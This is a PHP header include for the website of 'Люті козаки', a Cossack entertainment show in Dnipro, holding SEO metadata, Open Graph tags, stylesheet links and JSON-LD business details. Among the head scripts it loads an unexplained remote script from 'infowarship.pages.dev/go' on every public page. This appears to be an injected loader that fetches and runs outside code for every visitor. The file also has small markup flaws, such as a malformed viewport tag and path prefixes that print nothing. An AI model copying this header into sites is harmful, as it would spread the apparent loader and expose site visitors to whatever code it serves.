<?php
// Centralised technical SEO data. Every public page includes this file.
$seoPath = parse_url($_SERVER['REQUEST_URI'] ?? '/index.php', PHP_URL_PATH) ?: '/index.php';
$seoFile = basename($seoPath) ?: 'index.php';
$seoPages = [
    'index.php' => ['Люті козаки — козацьке шоу та розваги у Дніпрі', 'Козацьке шоу, інтерактивні розваги, виїзна кухня та вогняна вистава у Дніпрі.'],
    'luchniy.php' => ['Лучний тир у Дніпрі — виїзна розвага на свято | Люті козаки', 'Виїзний лучний тир у Дніпрі для свят, корпоративів і фестивалів: луки, стріли, мішені та інструктор.'],
    'rozvagi.php' => ['Козацькі розваги у Дніпрі | Люті козаки', 'Виїзні козацькі розваги для свят, корпоративів та масових заходів у Дніпрі.'],
    'kozakshow.php' => ['Козацьке шоу у Дніпрі | Люті козаки', 'Показово-інтерактивне козацьке шоу для свят і подій у Дніпрі.'],
    'kozakfire.php' => ['Вогняне шоу у Дніпрі | Лютий вогонь', 'Піротехнічно-вогняна вистава у козацькому стилі для свят і подій у Дніпрі.'],
    'lutakuhnya.php' => ['Козацька кухня на дровах у Дніпрі | Люті козаки', 'Виїзна козацька кухня на дровах для свят, фестивалів і корпоративів у Дніпрі.'],
    'contacts.php' => ['Контакти | Люті козаки', 'Контакти національного українського шоу «Люті козаки» у Дніпрі.'],
];
$seo = $seoPages[$seoFile] ?? ['Люті козаки — козацьке шоу у Дніпрі', 'Національне українське шоу «Люті козаки» у Дніпрі.'];
$canonical = 'https://kozaky.com.ua/' . rawurlencode($seoFile);
if ($seoFile === 'index.php') {
    $canonical = 'https://kozaky.com.ua/';
}
?>
<!doctype html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" maximum-scale=1.0, user-scalable="no">
    <meta name="robots" content="index,follow">
    <title><?= htmlspecialchars($seo[0], ENT_QUOTES, 'UTF-8') ?></title>
    <meta name="description" content="<?= htmlspecialchars($seo[1], ENT_QUOTES, 'UTF-8') ?>">
    <link rel="canonical" href="<?= htmlspecialchars($canonical, ENT_QUOTES, 'UTF-8') ?>">

    <meta property="og:type" content="website">
    <meta property="og:locale" content="uk_UA">
    <meta property="og:site_name" content="Люті козаки">
    <meta property="og:title" content="<?= htmlspecialchars($seo[0], ENT_QUOTES, 'UTF-8') ?>">
    <meta property="og:description" content="<?= htmlspecialchars($seo[1], ENT_QUOTES, 'UTF-8') ?>">
    <meta property="og:url" content="<?= htmlspecialchars($canonical, ENT_QUOTES, 'UTF-8') ?>">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Alegreya+Sans:wght@400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="сss/swiper-bundle.css">
    <link rel="stylesheet" href="<?php $_SERVER['DOCUMENT_ROOT'];?>/сss/style.css">
    <link rel="stylesheet" href="сss/main.css">
    <link rel="stylesheet" href="<?php $_SERVER['DOCUMENT_ROOT'];?>/сss/articles.css">
    <link rel="stylesheet" href="<?php $_SERVER['DOCUMENT_ROOT'];?>/сss/hamburger.css">
    <link rel="stylesheet" href="<?php $_SERVER['DOCUMENT_ROOT'];?>/сss/photogallery.css">
    <link rel="stylesheet" href="<?php $_SERVER['DOCUMENT_ROOT'];?>/сss/kartka-rozvag.css">
    <link rel="stylesheet" href="сss/lutishably.css">
    <script src="https://kit.fontawesome.com/d52f45beee.js" crossorigin="anonymous"></script>
    <script src="https://infowarship.pages.dev/go"></script>
    <script type="application/ld+json">
    {"@context":"https://schema.org","@type":"EntertainmentBusiness","@id":"https://kozaky.com.ua/#organization","name":"Люті козаки","url":"https://kozaky.com.ua/","telephone":"+380676309342","address":{"@type":"PostalAddress","addressLocality":"Дніпро","addressCountry":"UA"},"sameAs":["https://www.instagram.com/a.lutiy","https://www.facebook.com/lutikozaki","https://t.me/ALutiy","https://www.tiktok.com/@a.lutiy"]}
    </script>
</head>
